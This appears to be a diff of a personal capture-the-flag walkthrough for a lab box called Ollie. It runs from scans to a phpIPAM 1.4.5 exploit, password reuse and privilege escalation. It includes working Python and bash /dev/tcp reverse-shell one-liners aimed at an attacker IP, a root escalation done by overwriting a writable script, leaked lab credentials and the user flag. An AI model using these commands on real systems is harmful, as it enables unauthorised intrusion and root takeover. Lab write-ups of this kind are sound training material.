@@ -94,7 +94,7 @@ by Ben "epi" Risher 🤓                 ver: 2.11.0
 [####################] - 0s     42723/42723   114847/s http://10.10.143.226/css/font-awesome/ => Directory listing (add --scan-dir-listings to scan)
 [####################] - 7s     42723/42723   6002/s  http://10.10.143.226/css/bootstrap/ => Directory listing (add --scan-dir-listings to scan)
 ```
-nmap
+nmap scan
 ```shell
 map -A -T4 -p- 10.10.143.226
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-08 12:24 GMT
@@ -191,8 +191,7 @@ HOP RTT       ADDRESS
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 487.81 seconds
 ```
-
-
+interesting port 1337 try to connect
 ```shell
  nc 10.10.131.185 1337
 Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.
@@ -213,7 +212,86 @@ After a lengthy discussion, we've come to the conclusion that you are the right 
                     Password: OllieUnixMontgomery!
 
 PS: Good luck and next time bring some treats!
-
 ```
+we have password and login, try to go in 
+![[Pasted image 20251109190528.png]]
+we have phpIPAM admin panel and v1.4.5 phpPAM try to find explot
+![[Pasted image 20251109190710.png]]
+now use this 
+```shell
+python3 50963.py -url "http://10.10.131.185" -usr admin -pwd OllieUnixMontgomery!  --path /var/www/html --shell  
 
+█▀█ █░█ █▀█ █ █▀█ ▄▀█ █▀▄▀█   ▄█ ░ █░█ ░ █▀   █▀ █▀█ █░░ █   ▀█▀ █▀█   █▀█ █▀▀ █▀▀
+█▀▀ █▀█ █▀▀ █ █▀▀ █▀█ █░▀░█   ░█ ▄ ▀▀█ ▄ ▄█   ▄█ ▀▀█ █▄▄ █   ░█░ █▄█   █▀▄ █▄▄ ██▄
 
+█▄▄ █▄█   █▄▄ █▀▀ █░█ █ █▄░█ █▀▄ █▄█ █▀ █▀▀ █▀▀
+█▄█ ░█░   █▄█ ██▄ █▀█ █ █░▀█ █▄▀ ░█░ ▄█ ██▄ █▄▄
+
+[...] Trying to log in as admin
+[+] Login successful!
+[...] Exploiting
+Shell> 
+```
+make reverce shell 
+```shell
+Shell> export RHOST="10.11.147.65";export RPORT=9000;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
+```
+```shell
+nc -lvnp 9000         
+listening on [any] 9000 ...
+connect to [10.11.147.65] from (UNKNOWN) [10.10.131.185] 57116
+```
+and we are in, try to read user flag
+```shell
+www-data@ip-10-10-131-185:/home/ollie$ cat user.txt
+cat user.txt
+cat: user.txt: Permission denied
+```
+we cant, use a pasword for admin here for ollie user and
+```shell
+www-data@ip-10-10-131-185:/home/ollie$ su ollie
+su ollie
+Password: OllieUnixMontgomery!
+
+ollie@ip-10-10-131-185:~$ cd /home/ollie
+cd /home/ollie
+ollie@ip-10-10-131-185:~$ ls -la
+ls -la
+total 36
+drwxr-xr-x 5 ollie ollie 4096 Feb 10  2022 .
+drwxr-xr-x 4 root  root  4096 Nov  9 09:05 ..
+lrwxrwxrwx 1 root  root     9 Feb  6  2022 .bash_history -> /dev/null
+-rw-r--r-- 1 ollie ollie  220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 ollie ollie 3771 Feb 25  2020 .bashrc
+drwx------ 2 ollie ollie 4096 Feb  6  2022 .cache
+drwxrwxr-x 3 ollie ollie 4096 Feb  6  2022 .config
+drwxrwxr-x 3 ollie ollie 4096 Feb  6  2022 .local
+-rw-r--r-- 1 ollie ollie  807 Feb 25  2020 .profile
+-rw-r--r-- 1 ollie ollie    0 Feb 10  2022 .sudo_as_admin_successful
+-r-x------ 1 ollie ollie   29 Feb 10  2022 user.txt
+ollie@ip-10-10-131-185:~$ cat user.txt
+cat user.txt
+THM{Ollie_boi_is_daH_Cut3st}
+```
+and have a first flag, next step root, linpeas dont give any useful information, i tried ro check pspy64 to find process 
+i find `feedme`
+```shell
+ollie@ip-10-10-116-127:/home$ ls -la /usr/bin/feedme
+-rwxrw-r-- 1 root ollie 30 Feb 12  2022 /usr/bin/feedme
+```
+we can write, use this bash `bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1"` and we will be a root(i tried without reverse shell but it doesnt working)
+```shell
+echo '#!/bin/bash
+bash -i >& /dev/tcp/10.11.147.65/9001 0>&1' > /usr/bin/feedme
+```
+ad we are root:
+```shell
+nc -lvnp 9001
+listening on [any] 9001 ...
+connect to [10.11.147.65] from (UNKNOWN) [10.10.116.127] 59194
+bash: cannot set terminal process group (1813): Inappropriate ioctl for device
+bash: no job control in this shell
+root@ip-10-10-116-127:/# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+```
